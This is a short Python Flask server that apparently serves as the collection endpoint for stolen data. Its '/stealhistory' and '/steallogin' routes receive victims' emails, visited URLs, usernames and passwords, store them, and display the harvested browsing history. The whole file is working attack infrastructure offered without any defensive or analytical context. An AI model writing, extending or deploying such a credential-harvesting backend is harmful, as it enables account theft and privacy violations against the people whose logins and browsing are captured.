
from flask import Flask, render_template, request, session, redirect, url_for
import history, login

app = Flask(__name__)

@app.route("/")
def hello():
    return "Hello World!"


@app.route("/stealhistory", methods=['POST', 'GET'])
def stealhistory():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        time = request.form['last_visited']
        history.addToHistory(email, url, time)
        return "\n\n\nWe added to history: " + email
    elif request.method == 'GET':
        data = history.getHistory()
        return render_template('history.html', data = data)

@app.route("/steallogin", methods=['POST'])
def steallogin():
    if request.method == 'POST':
        email = request.form['email']
        url = request.form['url']
        username = request.form['username']
        password = request.form['password']
        login.addToLogin(email, url, username, password)
        return "we all good here"